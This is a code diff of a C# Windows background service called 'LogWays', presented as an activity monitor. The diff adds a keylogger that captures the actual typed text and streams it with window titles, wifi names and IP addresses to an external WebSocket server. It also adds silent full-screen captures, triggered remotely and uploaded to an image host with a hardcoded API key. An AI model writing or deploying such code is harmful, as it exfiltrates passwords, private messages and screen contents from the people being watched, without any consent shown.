@@ -1,85 +1,78 @@
-using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Net.Http;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Net.WebSockets;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.Json;
-using System.Threading;
-using System.Threading.Tasks;
-using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace LogWays;
 
 public class Worker : BackgroundService
 {
-    const string WS_URI = "wss://ws.alimad.co/socket";
-    const string WS_PASSWORD = "AlimadCo(10)";
-    const string API_POST_URL = "https://activity.alimad.co/endpoint";
+    const string WS_URI = false ? "ws://localhost:8392/socket" : "wss://ws.alimad.co/socket";
+    static string ipa = "0.0.0.0";
     const double TOTAL_RAM = 8L * 1024 * 1024 * 1024;
     const int CPU_CORES = 8;
     uint last_process = 0;
 
-    readonly HttpClient http = new();
-    readonly Dictionary<int, double> lastCpu = new();
-    readonly Dictionary<int, DateTime> lastTime = new();
+    readonly Dictionary<int, double> lastCpu = [];
+    readonly Dictionary<int, DateTime> lastTime = [];
     readonly string deviceName = Environment.MachineName;
 
     ClientWebSocket ws = null!;
-    CancellationTokenSource wsCts = new();
+    private readonly CancellationTokenSource wsCts = new();
 
-    [DllImport("user32.dll")]
-    static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
+    [DllImport("kernel32.dll")] static extern uint GetTickCount();
+    [DllImport("user32.dll")] static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
+    [DllImport("user32.dll")] static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
+    [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr hWnd);
+    [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int maxLength);
+    [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);
+    [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
+    [StructLayout(LayoutKind.Sequential)] struct RECT { public int Left; public int Top; public int Right; public int Bottom; }
 
-    [DllImport("user32.dll")]
-    static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
+    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
 
-    [DllImport("kernel32.dll")]
-    static extern uint GetTickCount();
+    [StructLayout(LayoutKind.Sequential)]
+    struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
 
     public Worker()
     {
-        KeyCounter.Start();
+        KeyLogger.Start();
         MouseCounter.Start();
+        Task.Run(GetPublicIpAsync);
         Task.Run(() => WsConnectLoopAsync(wsCts.Token));
     }
 
     protected override async Task ExecuteAsync(CancellationToken token)
     {
-        var minuteBuffer = new List<Dictionary<string, object>>(capacity: 60);
         var sampleInterval = TimeSpan.FromSeconds(1);
 
         while (!token.IsCancellationRequested)
         {
             var sample = new Dictionary<string, object>();
-
             try
             {
                 var hwnd = GetForegroundWindow();
                 if (hwnd != IntPtr.Zero)
                 {
-                    GetWindowThreadProcessId(hwnd, out uint pid);
+                    _ = GetWindowThreadProcessId(hwnd, out uint pid);
                     var p = Process.GetProcessById((int)pid);
+
                     string iconBase64 = "";
-                    var ico = GetAppIcon(p);
-                    if (last_process != pid){ 
-                        if(ico != null){
-                            iconBase64 = IconToBase64(ico);
-                        } else
-                        {
-                            iconBase64 = "none";
-                        }
+                    if (last_process != pid)
+                    {
+                        var ico = GetAppIcon(p);
+                        iconBase64 = ico != null ? IconToBase64(ico) : "none";
                     }
-                    sample["icon"] = iconBase64;
                     last_process = pid;
 
-
-                    string name = CsvSafe(p.ProcessName);
-                    string title = CsvSafe(p.MainWindowTitle);
-
+                    string name = p.ProcessName;
+                    string title = p.MainWindowTitle;
                     long ramBytes = p.WorkingSet64;
                     double ramPercent = (ramBytes / TOTAL_RAM) * 100.0;
 
@@ -87,13 +80,15 @@ public class Worker : BackgroundService
                     DateTime nowTime = DateTime.UtcNow;
                     double cpuPercent = 0.0;
 
-                    if (lastCpu.TryGetValue(p.Id, out double prevCpu) &&
-                        lastTime.TryGetValue(p.Id, out DateTime prevTime))
+                    if (lastCpu.TryGetValue(p.Id, out double prevCpu) && lastTime.TryGetValue(p.Id, out DateTime prevTime))
                     {
                         double cpuDelta = nowCpu - prevCpu;
                         double timeDelta = (nowTime - prevTime).TotalMilliseconds;
                         if (timeDelta > 0) cpuPercent = (cpuDelta / timeDelta) * 100.0 / CPU_CORES;
                     }
+
+                    int battery = BatteryMonitor.GetBatteryPercent();
+                    bool charge = BatteryMonitor.IsPluggedIn();
 
                     lastCpu[p.Id] = nowCpu;
                     lastTime[p.Id] = nowTime;
@@ -101,11 +96,21 @@ public class Worker : BackgroundService
                     sample["device"] = deviceName;
                     sample["app"] = name;
                     sample["title"] = title;
+                    sample["icon"] = iconBase64;
                     sample["ramPercent"] = Math.Round(ramPercent, 2);
                     sample["cpuPercent"] = Math.Round(cpuPercent, 2);
-                    try { sample["wifi"] = WifiHelper.GetWifiName(); } catch { sample["wifi"] = ""; }
+                    sample["batteryPercent"] = battery;
+                    if (charge) sample["charging"] = true;
+                    sample["wifi"] = WifiHelper.GetWifiName();
                     sample["isIdle"] = IsIdle();
-                    sample["keysPressed"] = KeyCounter.ResetCount();
+                    string keys = KeyLogger.GetKeys();
+                    sample["meta"] = GetWindowStatus();
+                    sample["fullscreen"] = IsFullscreen(hwnd);
+                    var (left, right) = IsSplitScreen(hwnd);
+                    sample["splitLeft"] = left;
+                    sample["splitRight"] = right;
+                    sample["keys"] = keys;
+                    sample["keysPressed"] = keys.Length;
                     sample["mouseClicks"] = MouseCounter.ResetClicks();
                     sample["isSleeping"] = hwnd == IntPtr.Zero;
                 }
@@ -116,58 +121,28 @@ public class Worker : BackgroundService
                     sample["isIdle"] = true;
                     sample["isSleeping"] = true;
                 }
-
                 sample["localIp"] = GetLocalIPAddress();
             }
             catch (Exception ex)
             {
                 sample["error"] = ex.Message;
             }
+
             _ = SendWebSocketSampleAsync(sample);
-            minuteBuffer.Add(sample);
-            if (minuteBuffer.Count >= 60)
-            {
-                var aggregate = AggregateMinute(minuteBuffer);
-                minuteBuffer.Clear();
-                _ = PostAggregateAsync(aggregate);
-            }
 
             await Task.Delay(sampleInterval, token);
         }
     }
-
-    static Dictionary<string, object> AggregateMinute(List<Dictionary<string, object>> bucket)
+    static async Task<string> GetPublicIpAsync()
     {
-        double sumCpu = 0;
-        double sumRam = 0;
-        int cpuCount = 0;
-        int ramCount = 0;
-        var appCounts = new Dictionary<string,int>(StringComparer.OrdinalIgnoreCase);
-        string wifi = "";
-
-        foreach (var s in bucket)
+        try
         {
-            if (s.TryGetValue("cpuPercent", out var c) && c is double cd) { sumCpu += cd; cpuCount++; }
-            if (s.TryGetValue("ramPercent", out var r) && r is double rd) { sumRam += rd; ramCount++; }
-            if (s.TryGetValue("app", out var a) && a is string app && !string.IsNullOrEmpty(app)) { appCounts.TryGetValue(app, out int v); appCounts[app] = v + 1; }
-            if (string.IsNullOrEmpty(wifi) && s.TryGetValue("wifi", out var w) && w is string ws && !string.IsNullOrEmpty(ws)) wifi = ws;
+            using var httpClient = new HttpClient();
+            ipa = await httpClient.GetStringAsync("https://api.ipify.org");
+            return ipa;
         }
-
-        string dominantApp = "";
-        int domMax = 0;
-        foreach (var kv in appCounts) if (kv.Value > domMax) { domMax = kv.Value; dominantApp = kv.Key; }
-
-        return new Dictionary<string, object>
-        {
-            ["device"] = Environment.MachineName,
-            ["samples"] = bucket.Count,
-            ["avgCpuPercent"] = cpuCount > 0 ? Math.Round(sumCpu / cpuCount, 2) : 0,
-            ["avgRamPercent"] = ramCount > 0 ? Math.Round(sumRam / ramCount, 2) : 0,
-            ["dominantApp"] = dominantApp,
-            ["wifi"] = wifi,
-        };
+        catch { return "0.0.0.0"; }
     }
-
     static string GetLocalIPAddress()
     {
         try
@@ -185,11 +160,9 @@ public class Worker : BackgroundService
         catch { }
         return "0.0.0.0";
     }
-
     static bool IsIdle()
     {
-        LASTINPUTINFO lii = new LASTINPUTINFO();
-        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
+        LASTINPUTINFO lii = new LASTINPUTINFO { cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO)) };
         if (GetLastInputInfo(ref lii))
         {
             uint idleTime = (uint)Environment.TickCount - lii.dwTime;
@@ -197,28 +170,6 @@ public class Worker : BackgroundService
         }
         return false;
     }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct LASTINPUTINFO
-    {
-        public uint cbSize;
-        public uint dwTime;
-    }
-
-    [DllImport("user32.dll")]
-    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
-
-    async Task PostAggregateAsync(Dictionary<string, object> aggregate)
-    {
-        try
-        {
-            var json = JsonSerializer.Serialize(aggregate);
-            using var content = new StringContent(json, Encoding.UTF8, "application/json");
-            var res = await http.PostAsync(API_POST_URL, content);
-        }
-        catch { }
-    }
-
     async Task SendWebSocketSampleAsync(Dictionary<string, object> sample)
     {
         try
@@ -230,57 +181,151 @@ public class Worker : BackgroundService
         }
         catch { }
     }
+    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
     async Task WsConnectLoopAsync(CancellationToken ct)
     {
+        string logPath = Path.Combine(desktopPath, "ws_errors.txt");
+
         while (!ct.IsCancellationRequested)
         {
             try
             {
                 ws = new ClientWebSocket();
-                var uri = new Uri(WS_URI);
-                await ws.ConnectAsync(uri, ct);
+                await ws.ConnectAsync(new Uri(WS_URI), ct);
+                var authMsg = JsonSerializer.Serialize(new { type = "auth", password = Passwords.WS_PASSWORD, device = deviceName });
+                await ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(authMsg)), WebSocketMessageType.Text, true, ct);
 
-                var authMsg = JsonSerializer.Serialize(new { type = "auth", password = WS_PASSWORD, device = deviceName });
-                var bytes = Encoding.UTF8.GetBytes(authMsg);
-                await ws.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, ct);
-
-                var buffer = new byte[4096];
+                var buffer = new byte[1024 * 1024];
                 while (ws.State == WebSocketState.Open && !ct.IsCancellationRequested)
                 {
-                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), ct);
-                    if (result.MessageType == WebSocketMessageType.Close) break;
+                    try
+                    {
+                        var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), ct);
+                        if (result.MessageType == WebSocketMessageType.Close) break;
+
+                        using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(buffer, 0, result.Count));
+                        if (doc.RootElement.TryGetProperty("type", out var t) && t.GetString() == "request")
+                        {
+                            string targetDevice = doc.RootElement.GetProperty("device").GetString() ?? "";
+                            if (targetDevice == deviceName)
+                            {
+                                try
+                                {
+                                    string screenshotBase64 = TakeScreenshotBytes(out var bytes);
+
+                                    string screenshotFile = Path.Combine(desktopPath, $"screenshot.png");
+
+                                    string url = await UploadToImgBBAsync(bytes);
+
+                                    var payload = JsonSerializer.Serialize(new
+                                    {
+                                        type = "screenshot",
+                                        time = DateTime.UtcNow,
+                                        data = url,
+                                        device = deviceName
+                                    });
+                                    var bytesToSend = Encoding.UTF8.GetBytes(payload);
+                                    await ws.SendAsync(new ArraySegment<byte>(bytesToSend), WebSocketMessageType.Text, true, CancellationToken.None);
+                                }
+                                catch (Exception ex)
+                                {
+                                    await File.AppendAllTextAsync(logPath, $"[{DateTime.Now}] Send screenshot failed: {ex}\n");
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        await File.AppendAllTextAsync(logPath, $"[{DateTime.Now}] Receive/process failed: {ex}\n");
+                    }
                 }
             }
-            catch { }
-            finally { try { ws?.Abort(); ws?.Dispose(); } catch { } }
+            catch (Exception ex)
+            {
+                await File.AppendAllTextAsync(logPath, $"[{DateTime.Now}] WS connection failed: {ex}\n");
+            }
+            finally
+            {
+                try { ws?.Abort(); ws?.Dispose(); } catch { }
+            }
+
             await Task.Delay(2000, ct);
         }
     }
 
-    static string CsvSafe(string s)
+    static readonly HttpClient httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
+
+    async Task<string> UploadToImgBBAsync(byte[] imageBytes)
     {
-        if (string.IsNullOrEmpty(s)) return "";
-        s = s.Replace("\"", "\"\"");
-        if (s.Contains(',') || s.Contains('"') || s.Contains('\n'))
-            return $"\"{s}\"";
-        return s;
+        var content = new MultipartFormDataContent();
+        content.Add(new StringContent(Convert.ToBase64String(imageBytes)), "image");
+        content.Add(new StringContent("0035f29ef2ddb2862584cd5114e4a7ee"), "key");
+
+        using var response = await httpClient.PostAsync("https://api.imgbb.com/1/upload", content);
+        response.EnsureSuccessStatusCode();
+        using var doc = JsonDocument.Parse(await response.Content.ReadAsStringAsync());
+        return doc.RootElement.GetProperty("data").GetProperty("url").GetString() ?? "";
     }
 
-    static Icon? GetAppIcon(Process p)
+    string TakeScreenshotBytes(out byte[] bytes)
     {
-        try
-        {
-            return Icon.ExtractAssociatedIcon(p.MainModule!.FileName!);
-        }
-        catch { return null; }
-    }
-
-    static string IconToBase64(Icon icon)
-    {
-        using var bmp = icon.ToBitmap();
+        var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
+        using var bmp = new Bitmap(bounds.Width, bounds.Height);
+        using var g = Graphics.FromImage(bmp);
+        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
         using var ms = new MemoryStream();
-        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
-        return Convert.ToBase64String(ms.ToArray());
+        bmp.Save(ms, ImageFormat.Png);
+        bytes = ms.ToArray();
+        return Convert.ToBase64String(bytes);
     }
+
+    static Dictionary<string, bool> GetWindowStatus()
+    {
+        var map = new Dictionary<string, bool> {
+        { "slack", false },
+        { "discord", false },
+        { "whatsapp.root", false },
+        { "code", false },
+        { "chrome", false },
+        { "windowsterminal", false }
+    };
+        EnumWindows((h, l) =>
+        {
+            var sb = new StringBuilder(256);
+            GetWindowText(h, sb, 256);
+            string title = sb.ToString().ToLower();
+
+            foreach (var k in map.Keys.ToList())
+            {
+                if (title.Contains(k)) map[k] = true;
+            }
+
+            return true;
+        }, IntPtr.Zero);
+
+        return map;
+    }
+    static bool IsFullscreen(IntPtr hWnd)
+    {
+        GetWindowRect(hWnd, out RECT r);
+        IntPtr desktop = GetDesktopWindow();
+        GetWindowRect(desktop, out RECT d);
+
+        return r.Left <= d.Left && r.Top <= d.Top &&
+               r.Right >= d.Right && r.Bottom >= d.Bottom;
+    }
+    static (bool left, bool right) IsSplitScreen(IntPtr hWnd)
+    {
+        GetWindowRect(hWnd, out RECT r);
+        IntPtr desktop = GetDesktopWindow();
+        GetWindowRect(desktop, out RECT d);
+        int mid = (d.Right - d.Left) / 2;
+        bool left = r.Left <= d.Left + 10 && r.Right <= mid + 15;
+        bool right = r.Left >= mid - 15 && r.Right >= d.Right - 10;
+        return (left, right);
+    }
+    static string CsvSafe(string s) => string.IsNullOrEmpty(s) ? "" : s.Contains(',') || s.Contains('"') || s.Contains('\n') ? $"\"{s.Replace("\"", "\"\"")}\"" : s;
+    static Icon? GetAppIcon(Process p) { try { return Icon.ExtractAssociatedIcon(p.MainModule!.FileName!); } catch { return null; } }
+    static string IconToBase64(Icon icon) { using var bmp = icon.ToBitmap(); using var ms = new MemoryStream(); bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png); return Convert.ToBase64String(ms.ToArray()); }
 }
